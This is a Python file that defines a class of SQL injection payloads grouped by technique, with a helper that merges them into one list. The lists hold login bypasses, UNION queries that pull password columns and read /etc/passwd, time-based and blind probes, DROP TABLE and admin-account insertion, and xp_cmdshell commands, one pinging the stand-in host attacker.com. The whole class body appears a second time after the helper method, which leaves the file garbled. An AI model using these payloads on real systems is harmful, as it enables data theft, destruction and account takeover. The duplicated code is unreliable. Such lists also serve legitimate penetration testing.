class SQLPayloads:
    AUTH_BYPASS = [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 'a'='a",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 1=1 --",
        "' AND 1=1--",
        "admin' or '1'='1' or 'x'='x",
    ]

    UNION_BASED = [
        "' UNION SELECT null--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT database(), user()--",
        "' UNION SELECT table_name, column_name FROM information_schema.columns--",
        "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        "' UNION SELECT pg_read_file('pg_hba.conf')--",
    ]

    INFO_GATHERING = [
        "' AND (SELECT COUNT(*) FROM users) > 1--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
        "' AND (SELECT TOP 1 name FROM sys.tables)--",
        "' AND (SELECT table_name FROM information_schema.tables LIMIT 1)--",
        "' UNION SELECT @@version--",
        "' UNION SELECT version()--",
    ]

    TIME_BASED = [
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5(1))--",
        "' OR IF(1=1, SLEEP(5), 0)--",
        "' OR 1=1 WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
    ]

    DB_MANIPULATION = [
        "'; DROP TABLE users--",
        "'; INSERT INTO users (username, password) VALUES ('admin', 'password')--",
        "'; UPDATE users SET role='admin' WHERE username='guest'--",
    ]

    ERROR_BASED = [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND 1=CAST(version() AS int)--",
        "' AND 1=(SELECT 1/0)--",
        "' AND 1=CONVERT(int, 'test')--",
    ]

    BLIND = [
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "' AND (SELECT username FROM users WHERE username LIKE 'a%') = 'admin'--",
        "' OR username LIKE 'a%'--",
    ]

    COMMAND_EXEC = [
        "' UNION SELECT 1, xp_cmdshell('ping -n 10 attacker.com')--",
        "'; EXEC xp_cmdshell('whoami')--",
    ]

    URL_ENCODED = [
        "%27%20OR%20%271%27%3D%271--",
    ]

    ADVANCED_LOGIC = [
        "' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--",
        "' OR (SELECT IF(1=1, 'true', 'false'))='true'--",
    ]

    NULL_BYTE = [
        "' OR '1'%00='1'--",
        "' OR 'admin'%00--",
    ]

    XML_BASED = [
        "' OR extractvalue(xmltype('<foo>bar</foo>'), '/foo') = 'bar'--",
    ]

    @classmethod
    def get_all_payloads(cls) -> list:
        """Returns all payloads combined into a single list"""
        all_payloads = []
        for attr in dir(cls):
            if attr.isupper() and isinstance(getattr(cls, attr), list):
                all_payloads.extend(getattr(cls, attr))
        return all_payloads 
    AUTH_BYPASS = [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 'a'='a",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 1=1 --",
        "' AND 1=1--",
        "admin' or '1'='1' or 'x'='x",
    ]

    UNION_BASED = [
        "' UNION SELECT null--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT database(), user()--",
        "' UNION SELECT table_name, column_name FROM information_schema.columns--",
        "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        "' UNION SELECT pg_read_file('pg_hba.conf')--",
    ]

    INFO_GATHERING = [
        "' AND (SELECT COUNT(*) FROM users) > 1--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
        "' AND (SELECT TOP 1 name FROM sys.tables)--",
        "' AND (SELECT table_name FROM information_schema.tables LIMIT 1)--",
        "' UNION SELECT @@version--",
        "' UNION SELECT version()--",
    ]

    TIME_BASED = [
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,MD5(1))--",
        "' OR IF(1=1, SLEEP(5), 0)--",
        "' OR 1=1 WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
    ]

    DB_MANIPULATION = [
        "'; DROP TABLE users--",
        "'; INSERT INTO users (username, password) VALUES ('admin', 'password')--",
        "'; UPDATE users SET role='admin' WHERE username='guest'--",
    ]

    ERROR_BASED = [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND 1=CAST(version() AS int)--",
        "' AND 1=(SELECT 1/0)--",
        "' AND 1=CONVERT(int, 'test')--",
    ]

    BLIND = [
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "' AND (SELECT username FROM users WHERE username LIKE 'a%') = 'admin'--",
        "' OR username LIKE 'a%'--",
    ]

    COMMAND_EXEC = [
        "' UNION SELECT 1, xp_cmdshell('ping -n 10 attacker.com')--",
        "'; EXEC xp_cmdshell('whoami')--",
    ]

    URL_ENCODED = [
        "%27%20OR%20%271%27%3D%271--",
    ]

    ADVANCED_LOGIC = [
        "' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--",
        "' OR (SELECT IF(1=1, 'true', 'false'))='true'--",
    ]

    NULL_BYTE = [
        "' OR '1'%00='1'--",
        "' OR 'admin'%00--",
    ]

    XML_BASED = [
        "' OR extractvalue(xmltype('<foo>bar</foo>'), '/foo') = 'bar'--",
    ]

    @classmethod
    def get_all_payloads(cls) -> list:
        """Returns all payloads combined into a single list"""
        all_payloads = []
        for attr in dir(cls):
            if attr.isupper() and isinstance(getattr(cls, attr), list):
                all_payloads.extend(getattr(cls, attr))
        return all_payloads